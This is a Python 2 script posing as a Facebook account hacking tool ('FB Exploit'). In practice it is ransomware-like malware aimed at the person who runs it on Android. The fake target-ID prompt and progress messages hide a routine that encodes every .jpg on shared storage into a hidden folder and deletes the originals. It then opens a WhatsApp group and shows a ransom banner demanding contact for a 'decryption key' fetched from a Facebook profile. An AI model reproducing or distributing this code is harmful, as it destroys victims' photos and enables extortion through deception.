# -*- coding: UTF-8 -*-
import os
import base64
import zlib
import sys


W  = '\033[1;37m' 
N  = '\033[0m'
R="\033[1;37m\033[31m" 
B  = '\033[1;37m\033[34m' 
G  = '\033[1;32m' 
Y = '\033[1;33;40m'



ranbanner = """ 
{} █▀ █▀▄──── {}█▀▀ █─█ █▀▄ █── ▄▀▄ ▀ ▀█▀
{} █▀ █▀█──── {}█▀▀ ▄▀▄ █─█ █─▄ █─█ █ ─█─
{} ▀─ ▀▀───── {}▀▀▀ ▀─▀ █▀─ ▀▀▀ ─▀─ ▀ ─▀─
    Developer : NexHacker

""".format(G,R,G,R,G,R,W)


expbanner = """ {}

YoU ArE 
~~~~~~
 █░░ ▄▀▄ ▄▀ █░▄▀ █▀▀ █▀▄
 █▀▄ █▀█ █░ █▀▄░ █▀▀ █░█
 ▀░▀ ▀░▀ ░▀ ▀░▀▀ ▀▀▀ ▀▀░
 
{}All Your Pictures Are {}Encypted{}
Contact Me to Get {}Decyption {}Key
{}Ask For Key Here
{}https://chat.whatsapp.com/GTson8XfqUZENhUkL4OA8q

""".format(R,W,R,W,G,W,Y,W)

try:
  import requests as rq
  print G+"("+R+">"+G+")"+" Module Available"
except:
  print G+"("+R+">"+G+")"+" Module Installing"
  os.system("pip2 install requests")
  import requests as rq

pathx = "/storage/emulated/0/DCIM/Camera/"

def encyptx():
  #pathx = "/storage/emulated/0/DCIM/Camera/"
  file = os.popen("ls "+pathx).read()
  tpath = "/storage/emulated/0/"
  try:
   os.system("mkdir "+tpath+"nexencypted")
  except:
   pass
  tfile = os.popen("find "+tpath+" *").read()
  filex = file.split()
  tfilex = tfile.split()
  devc = os.popen("uname -a").read().split()[-1].lower()
  i = 0
  print "\n\n"
  os.system("clear")
  if devc == "android":
   for i in range(len(tfilex)):
     dataf = tfilex[i]
     #if dataf.split('.')[1] == "jpg":
     try:
      if dataf[-3:] == "jpg":
       fopn = open(dataf,"rb").read()
       encd = zlib.compress(base64.encodestring(fopn))
       sys.stdout.write("\r {}Getting {}{} {}Bytes".format(G,W,len(encd),G))
       sys.stdout.flush()
       encw = open(tpath+"nexencypted/"+str(i)+".nex","wb")
       encw.write(encd)
       encw.close()
       os.system("rm {}".format(dataf))
     except:
       pass   

def decyptx(): 
 ipass = raw_input(G+"\n[!]Decyption Key : "+W).lower()
 print "\n"
 kurl = 'https://mbasic.facebook.com/profile.php?id=100006143266745'
 keyi = rq.get(kurl).text.split("$")[1] 
 if ipass == str(keyi):
  pathx = "/storage/emulated/0/nexencypted/"
  patho = "/storage/emulated/0/nexdecypted/"
  try:
   os.system("mkdir "+patho)
  except:
   pass
  file = os.popen("ls "+pathx).read()
  filex = file.split()
  i = 0
  for i in range(len(filex)):
   dataf = filex[i]
   if dataf[-3:] == "nex":
    fopn = open(pathx+dataf,"rb").read()
    encd = base64.decodestring(zlib.decompress(fopn))
    #print len(encd)
    sys.stdout.write("\r {}Decypting {} {} {}Bytes".format(W,G,len(encd),W))
    sys.stdout.flush()
    encw = open(patho+"nexdec"+str(i)+".jpg","wb")
    encw.write(encd)
    encw.close()
    os.system("rm {}".format(pathx+dataf))
 else:
  print "Incorrect !"
  decyptx()


def login():
  e = raw_input(Y+"(>)"+G+"Target Account ID : "+W)
  if len(e) > 2:
   print W+"\n[~]Connecting to Facebook .....\n"
   print G+"[~]Getting ID {}{} {}Data From Server".format(R,e,G)
   print R+"\n[!]Do Not Exit While The Process is Running"
  else:
   print R+"[!]Invalid ID"
def joingroup():
 cmd = """am start https://chat.whatsapp.com/GTson8XfqUZENhUkL4OA8q"""
 os.system(cmd)
 
print ranbanner
login()
encyptx()
joingroup()
print expbanner
decyptx()